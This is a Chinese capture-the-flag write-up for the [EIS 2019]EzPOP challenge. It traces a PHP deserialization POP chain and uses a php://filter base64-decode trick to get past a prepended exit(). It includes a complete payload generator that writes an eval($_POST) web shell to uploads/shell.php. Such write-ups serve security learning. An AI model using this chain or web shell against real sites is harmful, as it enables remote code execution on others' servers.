# \[EIS 2019]EzPOP

## \[EIS 2019]EzPOP

## 考点

* php://filter/write绕过“死亡exit”

## wp

给了源码，返回头看到PHP版本7.3。其实这里不给源码也可以做，用`arjun`可以探测参数，存在参数`src`，传入就可以看到源码了。

![](<../../.gitbook/assets/image (33) (1) (1) (1) (1) (1).png>)

给了源码，一点一点看。首先定义两个类，然后GET的src参数，上传目录`uploads/`，最后反序列化`data`

![](<../../.gitbook/assets/image (20) (1) (1) (1).png>)

确定是反序列化，然后找`__destruct()`作为入口，可以锁定`class A`，然后`$this->autosave`为`false`，然后不断向上调用

![](<../../.gitbook/assets/image (11) (1) (1) (1).png>)

`getForStorage()`那一大块可以写成一段代码，这段代码意思举个例子解释，比如`array("0"=>array("path"=>"a"))`，处理之后就是`array("0"=>"a")`，感觉有点多此一举。再json\_encode一下，变成一个字符串。在`getForStorage()`后执行的是 `$this->store->set()`，由此跳转到`class B`

```php
    function cleanContents(array $contents) {
        $cachedProperties = array_flip([
            'path', 'dirname', 'basename', 'extension', 'filename',
            'size', 'mimetype', 'visibility', 'timestamp', 'type',
        ]);
        foreach ($contents as $path => $object) {
            if (is_array($object)) {
                $contents[$path] = array_intersect_key($object, $cachedProperties);
            }
        }
        return $contents;
    }
  $cache = array("0"=>array("path"=>"a"));
  $cleaned = cleanContents($cache);
  var_dump(json_encode([$cleaned, "2"]));
```

到这可以先写一下Ａ类的序列化

```php
class A{
    protected $store;
    protected $key;
    protected $expire;
    
    public function __construct($store){
      $this->key = 'tmp1';
      $this->expire= 'tmp2';
      $this->store= $store;
    }
}
$b = new B();
$a = new A($b);
$a->cache = array("tmp3");
$a->complete = "tmp4";
```

然后看`class B`的set函数，接收的三个参数分别是`$name`，`$value`，`$expire`，分别与`$a->key`，`json_encode([$a->cache, "2"])`，`$a->expire`相关联。然后把`$expire`转化为整型，用`$this->options['prefix']`拼接`$name`，处理`$filename`，这里感觉也没啥用，对`$filename`和`$expire`处不处理并没有多大影响，更像是从哪个项目里复制出来的。

![](<../../.gitbook/assets/image (12) (1) (1).png>)

然后看一下`$value`的处理，它的值应该是类似于这种`[[{"path":"a"}],2]`，或者是这种`[["a"],2]`，把它作为参数传给`$this->serialize()`，在这个函数里面可以执行任意函数，但是没有函数的参数是像`$value`那种，所以这里最好是保持空过，`$serialize`就可以是`trim`或者`strval`之类的函数

```php
    protected function serialize($data): string {
        if (is_numeric($data)) {
            return (string) $data;
        }
        $serialize = $this->options['serialize'];
        return $serialize($data);
    }
```

接着往后看，这里的if是是否进行数据压缩，`$this->options['data_compress']`置为false，跳过这一步。`sprintf('%012d', $expire)`是把`$expire`左补齐12位，如果`$expire`是11，那么这个结果就是`000000000011`。再看这两行行，就是典型的php://filter的妙用，绕过“死亡exit”。`$data`为要写入的shell，`$filename`为`php://filter/write=convert.base64-decode/resource=shell.php`

```php
        if ($this->options['data_compress'] && function_exists('gzcompress')) {
            $data = gzcompress($data, 3);
        }
        $data = "<?php\n//" . sprintf('%012d', $expire) . "\n exit();?>\n" . $data;
        $result = file_put_contents($filename, $data);
        if ($result) {
            return true;
        }
        return false;
```

在`$data =` 那一行中，可以被base64识别的是`php000000000011exit`这19个字符，要在shell中补字符直到总长度符合base64解码规范

```php
class A{
    protected $store;
    protected $key;
    protected $expire;
    
    public function __construct($store){
      $this->key = 'uploads/shell.php';
      $this->expire= 1;
      $this->store= $store;
    }
}
class B{}
$b = new B();
$b->options['data_compress'] = false;
$b->options['prefix'] = "php://filter/write=convert.base64-decode/resource=";
$b->options['serialize'] = "trim";

$a = new A($b);
/* <?php eval($_POST[1]);?>*/
$a->cache = array("PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+");
$a->complete = 2;
```

如果这样生成代码，得到的value是`[["PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+"],2]`，前面是21个字符，中间补3个，后面补3个，最后cache是`array("aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+aaa")`

完整代码

```php
<?php
class A{
    protected $store;
    protected $key;
    protected $expire;
    
    public function __construct($store){
      $this->key = 'uploads/shell.php';
      $this->expire= 1;
      $this->store= $store;
    }
}
class B{}
$b = new B();
$b->options['data_compress'] = false;
$b->options['prefix'] = "php://filter/write=convert.base64-decode/resource=";
$b->options['serialize'] = "trim";

$a = new A($b);
/* <?php eval($_POST[1]);?>*/
$a->cache = array("aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+aaa");
$a->complete = 2;

echo urlencode(serialize($a));
```

![](<../../.gitbook/assets/image (32) (1) (1) (1) (1).png>)

## 小结

1. [谈一谈php://filter的妙用](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
2. [\[2020 新春红包题\]1](2020-xin-chun-hong-bao-ti-1.md)是它的增强版
